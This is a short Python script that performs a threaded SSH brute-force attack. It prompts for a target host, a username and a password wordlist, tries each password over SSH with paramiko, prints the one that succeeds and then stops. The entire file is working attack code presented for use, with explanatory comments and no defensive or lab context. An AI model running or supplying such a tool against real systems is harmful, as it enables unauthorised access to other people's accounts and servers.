import paramiko, sys, os, termcolor
import threading, time

stop_flag = 0

# Function to establish an SSH connection using a given password
def ssh_connect(password):
    global stop_flag  # Declare global stop_flag variable to modify it inside the function
    ssh = paramiko.SSHClient()  # Create an SSH client object
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())  # Automatically add host keys
    try:
        ssh.connect(host, port=22, username=username, password=password)  # Attempt SSH connection
        stop_flag = 1  # Set stop_flag to 1 if successful connection is established
        print(termcolor.colored(('[+] Found Password: ' + password + ', For Account: ' + username), 'green'))
    except:
        print(termcolor.colored(('[-] Incorrect Login: ' + password), 'red'))
    ssh.close()

host = input('[+] Target Address: ')
username = input('[+] SSH Username: ')
input_file = input('[+] Passwords File: ')
print('\n')

if os.path.exists(input_file) == False:
    print('[!!] That File/Path Doesnt Exist')
    sys.exit(1)

print('* * * Starting Threaded SSH Bruteforce On ' + host + ' With Account: ' + username + '* * *')

# Open the specified password file in read mode
with open(input_file, 'r') as file:
    for line in file.readlines():
        if stop_flag == 1:
            t.join()  # Wait for the thread to complete before exiting
            exit()    # Exit the script if the stop_flag is set
        password = line.strip()  # Remove leading/trailing whitespace from the password
        t = threading.Thread(target=ssh_connect, args=(password,))  # Create a thread for each password attempt
        t.start()  # Start the thread
        time.sleep(0.5)  # Sleep for a short duration to avoid overwhelming the system with threads
